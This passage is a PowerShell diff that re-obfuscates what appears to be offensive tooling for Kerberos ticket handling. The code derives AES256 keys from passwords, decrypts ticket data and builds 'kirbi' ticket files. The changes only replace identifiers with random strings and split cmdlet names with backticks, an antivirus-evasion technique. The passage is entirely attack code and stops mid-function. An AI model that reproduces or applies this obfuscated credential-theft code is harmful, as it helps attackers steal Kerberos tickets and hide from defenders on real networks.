+$ujSHyjvlCzlSXpaNLgWG = 
 {
 
     function Get-KerberosAES256BaseKey
     {
-        param([String]$TurkeyRacial,[System.Security.SecureString]$StripHill)
+        param([String]$fvLtWuYxTdyqqZOrRYhKwKBZrTRrOaKiJHxoeWONb,[System.Security.SecureString]$GIxqdkZiwLUjkTRpIfeRNHYyZ)
 
-        $ViewDry = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($StripHill)
-        $AbsurdFierce = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ViewDry)
-        [Byte[]]$TurkeyRacial = [System.Text.Encoding]::UTF8.GetBytes($TurkeyRacial)
-        [Byte[]]$AbsurdFierce = [System.Text.Encoding]::UTF8.GetBytes($AbsurdFierce)
-        $ObeseSoda = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
-        $FarmGroup = ne`w-`obje`ct Security.Cryptography.Rfc2898DeriveBytes($AbsurdFierce,$TurkeyRacial,4096)
+        $zXVcRygYrLJaLUTGnzeUmhBFg = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($GIxqdkZiwLUjkTRpIfeRNHYyZ)
+        $gvWxvdVEwISKunzQXioZWdICTNs = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($zXVcRygYrLJaLUTGnzeUmhBFg)
+        [Byte[]]$fvLtWuYxTdyqqZOrRYhKwKBZrTRrOaKiJHxoeWONb = [System.Text.Encoding]::UTF8.GetBytes($fvLtWuYxTdyqqZOrRYhKwKBZrTRrOaKiJHxoeWONb)
+        [Byte[]]$gvWxvdVEwISKunzQXioZWdICTNs = [System.Text.Encoding]::UTF8.GetBytes($gvWxvdVEwISKunzQXioZWdICTNs)
+        $jKNkpMMNuquvPPBZCwWAjWTSBHwUvITiKdZNIDWpwrrhT = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
+        $beOCYSmRLXxxRKqgTyhpiX = ne`w`-`ob`je`ct Security.Cryptography.Rfc2898DeriveBytes($gvWxvdVEwISKunzQXioZWdICTNs,$fvLtWuYxTdyqqZOrRYhKwKBZrTRrOaKiJHxoeWONb,4096)
         Remove-Variable password_cleartext
-        $EmptyCrazy = $FarmGroup.GetBytes(32)
-        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
-        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::None
-        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-        $MightySpooky.KeySize = 256
-        $MightySpooky.Key = $EmptyCrazy
-        $PoisedObese = $MightySpooky.CreateEncryptor()
-        $LyingSlim = $PoisedObese.TransformFinalBlock($ObeseSoda,0,$ObeseSoda.Length)
-        $DelayCloth = $PoisedObese.TransformFinalBlock($LyingSlim,0,$LyingSlim.Length)
-        $UtterBang = $LyingSlim[0..15] + $DelayCloth[0..15]
+        $KvxjJoMHrSnTzrrtwJJCVgUxlDRXrokycT = $beOCYSmRLXxxRKqgTyhpiX.GetBytes(32)
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD = ne`w`-`ob`je`ct "System.Security.Cryptography.AesManaged"
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.KeySize = 256
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Key = $KvxjJoMHrSnTzrrtwJJCVgUxlDRXrokycT
+        $zHAQrkiTEAFEyPGOZXlFmCBPZwmsPBsqlduAODnf = $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.CreateEncryptor()
+        $kAuSbcjHJeIfseWuAwQlnzzzmFNRbK = $zHAQrkiTEAFEyPGOZXlFmCBPZwmsPBsqlduAODnf.TransformFinalBlock($jKNkpMMNuquvPPBZCwWAjWTSBHwUvITiKdZNIDWpwrrhT,0,$jKNkpMMNuquvPPBZCwWAjWTSBHwUvITiKdZNIDWpwrrhT.Length)
+        $YivnhrrTcUgmzMfYRqMnatpYfnjqrTUXeht = $zHAQrkiTEAFEyPGOZXlFmCBPZwmsPBsqlduAODnf.TransformFinalBlock($kAuSbcjHJeIfseWuAwQlnzzzmFNRbK,0,$kAuSbcjHJeIfseWuAwQlnzzzmFNRbK.Length)
+        $TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu = $kAuSbcjHJeIfseWuAwQlnzzzmFNRbK[0..15] + $YivnhrrTcUgmzMfYRqMnatpYfnjqrTUXeht[0..15]
 
-        return $UtterBang
+        return $TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu
     }
 
     function Get-KerberosAES256UsageKey
     {
-        param([String]$VestFlow,[Int]$CountBrush,[Byte[]]$UtterBang)
+        param([String]$dqdCDwdCGyaqKoivQYsJ,[Int]$USRSohmeNbhbDQzyHTPamLQojhmxTgB,[Byte[]]$TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu)
 
-        $GrubbyHusky = 0x00 * 16
+        $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb = 0x00 * 16
 
-        if($VestFlow -eq 'checksum')
+        if($dqdCDwdCGyaqKoivQYsJ -eq 'checksum')
         {
-            switch($CountBrush) 
+            switch($USRSohmeNbhbDQzyHTPamLQojhmxTgB) 
             {
-                25 {[Byte[]]$ToughBaby = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $GrubbyHusky}
+                25 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
             }
         }
-        elseif($VestFlow -eq 'encrypt')
+        elseif($dqdCDwdCGyaqKoivQYsJ -eq 'encrypt')
         {
 
-            switch($CountBrush) 
+            switch($USRSohmeNbhbDQzyHTPamLQojhmxTgB) 
             {
-                1 {[Byte[]]$ToughBaby = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $GrubbyHusky}
-                2 {[Byte[]]$ToughBaby = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $GrubbyHusky}
-                3 {[Byte[]]$ToughBaby = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $GrubbyHusky}
-                4 {[Byte[]]$ToughBaby = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $GrubbyHusky}
-                7 {[Byte[]]$ToughBaby = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $GrubbyHusky}
-                11 {[Byte[]]$ToughBaby = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $GrubbyHusky}
-                12 {[Byte[]]$ToughBaby = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $GrubbyHusky}
-                14 {[Byte[]]$ToughBaby = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $GrubbyHusky}
+                1 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                2 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                3 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                4 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                7 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                11 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                12 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                14 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
             }
                 
         }
-        elseif($VestFlow -eq 'integrity') 
+        elseif($dqdCDwdCGyaqKoivQYsJ -eq 'integrity') 
         {
             
-            switch($CountBrush) 
+            switch($USRSohmeNbhbDQzyHTPamLQojhmxTgB) 
             {
-                1 {[Byte[]]$ToughBaby = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $GrubbyHusky}
-                4 {[Byte[]]$ToughBaby = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $GrubbyHusky}
-                7 {[Byte[]]$ToughBaby = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $GrubbyHusky}
-                11 {[Byte[]]$ToughBaby = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $GrubbyHusky}
+                1 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                4 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                7 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
+                11 {[Byte[]]$pYtNAOaLXwfjgWaeXRAihQnvG = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $YwOlaCcqScDYzHMJAZipZQoCUBxMxsuaXIptvb}
             }
 
         }
 
-        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
-        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-        $MightySpooky.KeySize = 256
-        $MightySpooky.Key = $UtterBang
-        $PoisedObese = $MightySpooky.CreateEncryptor()
-        $GirlKnotty = $PoisedObese.TransformFinalBlock($ToughBaby,0,$ToughBaby.Length)
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD = ne`w`-`ob`je`ct "System.Security.Cryptography.AesManaged"
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.KeySize = 256
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Key = $TXOKWOPVOPOIkTeJXaEmWVpFDvEmMfcu
+        $zHAQrkiTEAFEyPGOZXlFmCBPZwmsPBsqlduAODnf = $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.CreateEncryptor()
+        $DfvFcHratFVSqBQhhhBAtuk = $zHAQrkiTEAFEyPGOZXlFmCBPZwmsPBsqlduAODnf.TransformFinalBlock($pYtNAOaLXwfjgWaeXRAihQnvG,0,$pYtNAOaLXwfjgWaeXRAihQnvG.Length)
 
-        return $GirlKnotty
+        return $DfvFcHratFVSqBQhhhBAtuk
     }
 
     function Get-ASN1Length
     {
-        param ([Byte[]]$GateNasty)
+        param ([Byte[]]$ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND)
     
-        $ColorReply = 0
+        $vfvDllDKJdYKKWFSzYEB = 0
     
-        while ($GateNasty[$ColorReply] -ne 3 -and $GateNasty[$ColorReply] -ne 129 -and $GateNasty[$ColorReply] -ne 130 -and $GateNasty[$ColorReply] -ne 131 -and $GateNasty[$ColorReply] -ne 132 -and $ColorReply -lt 1)
+        while ($ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB] -ne 3 -and $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB] -ne 129 -and $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB] -ne 130 -and $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB] -ne 131 -and $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB] -ne 132 -and $vfvDllDKJdYKKWFSzYEB -lt 1)
         {
-            $ColorReply++   
+            $vfvDllDKJdYKKWFSzYEB++   
         }
     
-        switch ($GateNasty[$ColorReply]) 
+        switch ($ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB]) 
         {
             
             3
             { 
-                $ColorReply += 3 
-                $PlaceBook = $GateNasty[$ColorReply]
-                $ColorReply++
+                $vfvDllDKJdYKKWFSzYEB += 3 
+                $GDrWuJgEKDiRKaJZfsVrNpYQc = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB]
+                $vfvDllDKJdYKKWFSzYEB++
             }
     
             129
             {
-                $ColorReply += 1
-                $PlaceBook = $GateNasty[$ColorReply]
-                $ColorReply++
+                $vfvDllDKJdYKKWFSzYEB += 1
+                $GDrWuJgEKDiRKaJZfsVrNpYQc = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[$vfvDllDKJdYKKWFSzYEB]
+                $vfvDllDKJdYKKWFSzYEB++
             }
     
             130
             {
-                $ColorReply += 2
-                $PlaceBook = Get-UInt16DataLength 0 $GateNasty[($ColorReply)..($ColorReply - 1)]
-                $ColorReply++
+                $vfvDllDKJdYKKWFSzYEB += 2
+                $GDrWuJgEKDiRKaJZfsVrNpYQc = Get-UInt16DataLength 0 $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[($vfvDllDKJdYKKWFSzYEB)..($vfvDllDKJdYKKWFSzYEB - 1)]
+                $vfvDllDKJdYKKWFSzYEB++
             }
     
             131
             {
-                $ColorReply += 3
-                $PlaceBook = Get-UInt32DataLength 0 ($GateNasty[($ColorReply)..($ColorReply - 2)] + 0x00)
-                $ColorReply++
+                $vfvDllDKJdYKKWFSzYEB += 3
+                $GDrWuJgEKDiRKaJZfsVrNpYQc = Get-UInt32DataLength 0 ($ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[($vfvDllDKJdYKKWFSzYEB)..($vfvDllDKJdYKKWFSzYEB - 2)] + 0x00)
+                $vfvDllDKJdYKKWFSzYEB++
             }
     
             132
             {
-                $ColorReply += 4
-                $PlaceBook = Get-UInt32DataLength 0 $GateNasty[($ColorReply)..($ColorReply - 3)]
-                $ColorReply++
+                $vfvDllDKJdYKKWFSzYEB += 4
+                $GDrWuJgEKDiRKaJZfsVrNpYQc = Get-UInt32DataLength 0 $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[($vfvDllDKJdYKKWFSzYEB)..($vfvDllDKJdYKKWFSzYEB - 3)]
+                $vfvDllDKJdYKKWFSzYEB++
             }
     
         }
     
-        return $ColorReply,$PlaceBook
+        return $vfvDllDKJdYKKWFSzYEB,$GDrWuJgEKDiRKaJZfsVrNpYQc
     }
 
-    function Unprotect-HeapDetect
+    function Unprotect-fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn
     {
-        param([Byte[]]$DollRotten,[Byte[]]$BookFamous)
+        param([Byte[]]$eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD,[Byte[]]$cxTRBULpfmdyCpZmEMuwPNBzK)
 
-        $GabbyRoad = [Math]::Truncate($BookFamous.Count % 16)
-        [Byte[]]$PartPast = $BookFamous[($BookFamous.Count - $GabbyRoad)..$BookFamous.Count]
-        [Byte[]]$TwoPan = $BookFamous[($BookFamous.Count - $GabbyRoad - 16)..($BookFamous.Count - $GabbyRoad - 1)]
-        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
-        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-        $MightySpooky.KeySize = 256
-        $MightySpooky.Key = $DollRotten
-        $ShaveJump = $MightySpooky.CreateDecryptor()
-        $ChessFire = $ShaveJump.TransformFinalBlock($TwoPan,0,$TwoPan.Length)
-        [Byte[]]$MuddleSudden = $ChessFire[$GabbyRoad..$ChessFire.Count]
-        $PartPast += $MuddleSudden
-        [Byte[]]$WailMany = $BookFamous[0..($BookFamous.Count - $GabbyRoad - 17)] + $PartPast + $TwoPan
-        [Byte[]]$AskEffect = $ShaveJump.TransformFinalBlock($WailMany,0,$WailMany.Length)
+        $ureJyyNGbNmJpgpCdNzbqyr = [Math]::Truncate($cxTRBULpfmdyCpZmEMuwPNBzK.Count % 16)
+        [Byte[]]$iYcuxTrTmdvWkpyImSqQvYutbCPLzOwEkxWJUPBzh = $cxTRBULpfmdyCpZmEMuwPNBzK[($cxTRBULpfmdyCpZmEMuwPNBzK.Count - $ureJyyNGbNmJpgpCdNzbqyr)..$cxTRBULpfmdyCpZmEMuwPNBzK.Count]
+        [Byte[]]$WRZMfCcDLmJfNtotxdPWNlecRBfyfOhjdWNHlEVEDiPw = $cxTRBULpfmdyCpZmEMuwPNBzK[($cxTRBULpfmdyCpZmEMuwPNBzK.Count - $ureJyyNGbNmJpgpCdNzbqyr - 16)..($cxTRBULpfmdyCpZmEMuwPNBzK.Count - $ureJyyNGbNmJpgpCdNzbqyr - 1)]
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD = ne`w`-`ob`je`ct "System.Security.Cryptography.AesManaged"
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.KeySize = 256
+        $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.Key = $eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD
+        $lUUDjAWIjsGfbSRipKBJrFbNZvANvOoPewUKMCxHqQl = $MPYDdaEZAZUAtPfUaFTRvriAuJIVsscEJLaOPvwwELBD.CreateDecryptor()
+        $kegCqOSghKoRvVUMkozLNROlJ = $lUUDjAWIjsGfbSRipKBJrFbNZvANvOoPewUKMCxHqQl.TransformFinalBlock($WRZMfCcDLmJfNtotxdPWNlecRBfyfOhjdWNHlEVEDiPw,0,$WRZMfCcDLmJfNtotxdPWNlecRBfyfOhjdWNHlEVEDiPw.Length)
+        [Byte[]]$eUbgMArrBhiEVKAomTDNuaSdj = $kegCqOSghKoRvVUMkozLNROlJ[$ureJyyNGbNmJpgpCdNzbqyr..$kegCqOSghKoRvVUMkozLNROlJ.Count]
+        $iYcuxTrTmdvWkpyImSqQvYutbCPLzOwEkxWJUPBzh += $eUbgMArrBhiEVKAomTDNuaSdj
+        [Byte[]]$HTPkvwDrTdJvvPKAVPsIlPykvZm = $cxTRBULpfmdyCpZmEMuwPNBzK[0..($cxTRBULpfmdyCpZmEMuwPNBzK.Count - $ureJyyNGbNmJpgpCdNzbqyr - 17)] + $iYcuxTrTmdvWkpyImSqQvYutbCPLzOwEkxWJUPBzh + $WRZMfCcDLmJfNtotxdPWNlecRBfyfOhjdWNHlEVEDiPw
+        [Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = $lUUDjAWIjsGfbSRipKBJrFbNZvANvOoPewUKMCxHqQl.TransformFinalBlock($HTPkvwDrTdJvvPKAVPsIlPykvZm,0,$HTPkvwDrTdJvvPKAVPsIlPykvZm.Length)
 
-        return $AskEffect
+        return $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF
     }
 
-    function Get-MiceEnjoy
+    function Get-DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
     {
-        param([Byte[]]$JogPowder,[Byte[]]$ChunkyPlay)
+        param([Byte[]]$rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN,[Byte[]]$cBiKFEXRziLqcSvbkAToWH)
     
-        [Byte[]]$MiceEnjoy = $JogPowder + $ChunkyPlay
-        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
-        $MiceEnjoy = 0x76,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
+        [Byte[]]$DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN + $cBiKFEXRziLqcSvbkAToWH
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x30,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
+        $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = 0x76,0x84 + [System.BitConverter]::GetBytes($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)[3..0] + $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
     
-        return $MiceEnjoy
+        return $DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh
     }
     function Get-KirbiPartTwo
     {
-        param([Byte[]]$AskEffect)
+        param([Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF)
     
-        $GateNasty = Get-ASN1Length $AskEffect[4..9]
-        $TrashyMatch = $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + 4)..($TrashyMatch + 9)]
-        $TrashyMatch += $GateNasty[0]
-        $FastGrass = $AskEffect[($TrashyMatch + 7)]
-        $CoilTrail = $AskEffect[($TrashyMatch + $FastGrass + 22)]
-        $PlanesExcuse = $FastGrass + $CoilTrail
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $KindlyBoring = $AskEffect[($TrashyMatch + $PlanesExcuse + 73)]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
-        $TrashyMatch += $GateNasty[0]
-        $SilkReach = $AskEffect[($TrashyMatch + $PlanesExcuse + 73)]
-        $PopMiss = $AskEffect[($TrashyMatch + $PlanesExcuse + 75)]
-        [Byte[]]$UglySpace = $AskEffect[($TrashyMatch + $PlanesExcuse + 76)..($TrashyMatch + $PlanesExcuse + $PopMiss + 75)]
-        $PlanesExcuse += $PopMiss
-        $DirtVague = $AskEffect[($TrashyMatch + $PlanesExcuse + 88)]
-        [Byte[]]$CureScrew = $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + $DirtVague + 88)]
-        $PlanesExcuse += $DirtVague
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
-        $TrashyMatch += $GateNasty[0]
-        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
